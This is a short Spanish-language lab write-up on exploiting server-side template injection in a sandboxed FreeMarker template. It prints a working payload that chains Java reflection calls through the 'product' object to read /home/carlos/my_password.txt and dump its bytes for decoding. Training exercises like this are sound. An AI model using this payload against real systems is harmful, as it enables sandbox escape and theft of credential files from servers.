En esta clase explotamos una SSTI en Freemarker dentro de un entorno supuestamente aislado. Usamos el objeto **product** como punto de entrada para encadenar métodos de Java como ‘**getClass()**‘, ‘**getProtectionDomain()**‘ y ‘**openStream()**‘ hasta acceder al archivo sensible ‘**/home/carlos/my_password.txt**‘.

Obtenemos su contenido como bytes ASCII y lo convertimos para resolver el laboratorio, demostrando que incluso los entornos con sandbox pueden ser vulnerables si no se aíslan correctamente los métodos de reflexión.

Solucion
aqui nos encontramos con el mismo de freemarker
![Pasted_image_20250814203648.png](/Imagenes/Pasted_image_20250814203648.png)
entonce nos vamos a buscar el payload
![Pasted_image_20250814204301.png](/Imagenes/Pasted_image_20250814204301.png)
y lo ideal una ves terminado de configurar el payload sera convertirlo ascii
(${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")})
![Pasted_image_20250814204346.png](/Imagenes/Pasted_image_20250814204346.png)
https://www.prepostseo.com/tool/decimal-to-ascii
![Pasted_image_20250814204605.png](/Imagenes/Pasted_image_20250814204605.png)
